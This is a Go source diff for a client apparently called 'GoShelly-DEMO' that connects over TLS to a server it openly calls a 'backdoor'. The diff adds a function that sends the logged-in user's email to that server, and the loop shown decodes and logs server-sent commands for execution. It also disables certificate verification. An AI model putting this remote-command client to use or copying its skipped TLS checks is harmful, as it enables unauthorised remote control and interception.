@@ -3,7 +3,6 @@ package basic
 import (
 	"bytes"
 	"crypto/tls"
-	"crypto/x509"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
@@ -133,10 +132,10 @@ func dialReDial(serviceID string, config *tls.Config) *tls.Conn {
 		}
 		CONFIG.CLIENTLOG.Println("Connected to: ", strings.Split(conn.RemoteAddr().String(), ":")[0])
 		state := conn.ConnectionState()
-		for _, v := range state.PeerCertificates {
-			CONFIG.CLIENTLOG.Println(x509.MarshalPKIXPublicKey(v.PublicKey))
-			CONFIG.CLIENTLOG.Println(v.Subject)
-		}
+		// for _, v := range state.PeerCertificates {
+		// 	CONFIG.CLIENTLOG.Println(x509.MarshalPKIXPublicKey(v.PublicKey))
+		// 	CONFIG.CLIENTLOG.Println(v.Subject)
+		// }
 
 		CONFIG.CLIENTLOG.Println("client: handshake: ", state.HandshakeComplete)
 		return conn
@@ -147,51 +146,44 @@ func dialReDial(serviceID string, config *tls.Config) *tls.Conn {
 	return nil //will never reach this
 }
 
-
-
-
-func DeleteUser(confirm bool,deleteURL string){
-	if !confirm {
-		return
-	}
+func GetLoggedUser() t.LoggedUser {
 	var user t.LoggedUser
 	var temp []byte
 	file, _ := ioutil.ReadFile("./config/token-config.json")
 	err := json.Unmarshal([]byte(file), &user)
-	if err != nil{
+	if err != nil {
 		fmt.Println("Could not delete account. Try logging in again to delete your account")
 	}
 	temp, _ = base64.StdEncoding.DecodeString(user.EMAIL)
 	user.EMAIL = string(temp)
-	fmt.Println(user)
+	return user
+}
+
+func DeleteUser(confirm bool, deleteURL string) {
+	if !confirm {
+		return
+	}
+
+	user := GetLoggedUser()
 	var msg t.Msg
 	jsonReq, _ := json.Marshal(user)
-    req, err := http.NewRequest(http.MethodDelete, deleteURL, bytes.NewBuffer(jsonReq))
-	if err != nil{
+	req, err := http.NewRequest(http.MethodDelete, deleteURL, bytes.NewBuffer(jsonReq))
+	if err != nil {
 		fmt.Println("Could not request an account delete. Try again later.")
 	}
-    client := &http.Client{}
-    resp, err := client.Do(req)
-    if err != nil {
-        fmt.Println("Unable to read response.")
-    }
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		fmt.Println("Unable to read response.")
+	}
 
-    defer resp.Body.Close()
-    bodyBytes, _ := ioutil.ReadAll(resp.Body)
-	json.Unmarshal(bodyBytes,&msg)
-    fmt.Println(msg.MESSAGE)
+	defer resp.Body.Close()
+	bodyBytes, _ := ioutil.ReadAll(resp.Body)
+	json.Unmarshal(bodyBytes, &msg)
+	fmt.Println(msg.MESSAGE)
 }
 func LoginStatus(statusURL string) bool {
-	var user t.LoggedUser
-	var temp []byte
-	file, _ := ioutil.ReadFile("./config/token-config.json")
-
-	err := json.Unmarshal([]byte(file), &user)
-	if err != nil{
-		fmt.Println("Log in again.")
-	}
-	temp, _ = base64.StdEncoding.DecodeString(user.EMAIL)
-	user.EMAIL = string(temp)
+	user := GetLoggedUser()
 	resp := SendPOST(statusURL, user)
 	var obj t.LogSuccess
 	body, err := ioutil.ReadAll(resp.Body)
@@ -199,7 +191,6 @@ func LoginStatus(statusURL string) bool {
 		fmt.Println(resp.StatusCode, "Could not read response.")
 		return false
 	}
-
 	json.Unmarshal(body, &obj)
 	fmt.Println(obj.MESSAGE)
 	return resp.StatusCode == http.StatusAccepted
@@ -330,7 +321,7 @@ func SaveLoginResult(resp *http.Response, email string) {
 }
 
 func StartClient(HOST string, PORT string, SSLEMAIL string, logmax int) {
-
+	fmt.Println("Running GoShelly-DEMO")
 	CONFIG.HOST = HOST
 	CONFIG.PORT = PORT
 	CONFIG.SSLEMAIL = PORT
@@ -356,20 +347,20 @@ func StartClient(HOST string, PORT string, SSLEMAIL string, logmax int) {
 	config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
 	conn := dialReDial(CONFIG.HOST+":"+CONFIG.PORT, &config)
 	defer conn.Close()
-
+	introduceUserToBackdoor(conn, GetLoggedUser())
 	for {
 		buffer := make([]byte, 1024)
 		setReadDeadLine(conn)
 		_, err := conn.Read(buffer)
 		if err != nil {
 			CONFIG.CLIENTLOG.Println("Checking status.")
-			if err == io.EOF {
-				CONFIG.CLIENTLOG.Println("All commands ran successfully. Returning exit success.")
-				logClean("./logs/")
-				fmt.Println("Exit Success.")
-				returnLog()
-				os.Exit(0)
-			}
+			// if err == io.EOF {
+			// 	CONFIG.CLIENTLOG.Println("All commands ran successfully. Returning exit success.")
+			// 	logClean("./logs/")
+			// 	fmt.Println("Exit Success.")
+			// 	returnLog()
+			// 	os.Exit(0)
+			// }
 		}
 		sDec, _ := base64.StdEncoding.DecodeString(string(buffer[:]))
 		CONFIG.CLIENTLOG.Println("EXECUTE: ", string(sDec))
@@ -387,6 +378,48 @@ func StartClient(HOST string, PORT string, SSLEMAIL string, logmax int) {
 		buffer = nil
 	}
 }
+
+func introduceUserToBackdoor(conn *tls.Conn, user t.LoggedUser) {
+
+	encodedResp := base64.StdEncoding.EncodeToString([]byte(user.EMAIL))
+	setWriteDeadLine(conn)
+	_, err := conn.Write([]byte(encodedResp))
+	if err != nil {
+		CONFIG.CLIENTLOG.Println("Write Error. Could not introduce client to backdoor. Internal error or server disconnected. Exiting...")
+		os.Exit(1)
+	}
+	time.Sleep(2*time.Second)
+	buffer := make([]byte, 1024)
+	setReadDeadLine(conn)
+	_, err = conn.Read(buffer)
+	if err != nil{
+		CONFIG.CLIENTLOG.Println("Read Error. Could not introduce client to backdoor. Internal error or server disconnected. Exiting...")
+		os.Exit(1)
+	}
+	sDec, _ := base64.StdEncoding.DecodeString(string(buffer[:]))
+	if string(sDec) != "ok"{
+		CONFIG.CLIENTLOG.Println("Fatal. Could not introduce client to backdoor. "+string(buffer))
+		os.Exit(1)
+	}
+	time.Sleep(time.Second*2)
+	setReadDeadLine(conn)
+	_, err = conn.Read(buffer)
+	if err != nil{
+		CONFIG.CLIENTLOG.Println("Read Error. Could not introduce client to backdoor. Internal error or server disconnected. Exiting...")
+		os.Exit(1)
+	}
+
+	setReadDeadLine(conn)
+	_, err = conn.Read(buffer)
+	if err != nil{
+		CONFIG.CLIENTLOG.Println("Read Error. Could not introduce client to backdoor. Internal error or server disconnected. Exiting...")
+		os.Exit(1)
+	}
+	sDec, _ = base64.StdEncoding.DecodeString(string(buffer[:]))
+	CONFIG.CLIENTLOG.Println("Client-Server-Intro="+string(sDec))
+
+}
+
 func validateEMailAddress(address string) bool {
 	_, err := mail.ParseAddress(address)
 	return err == nil
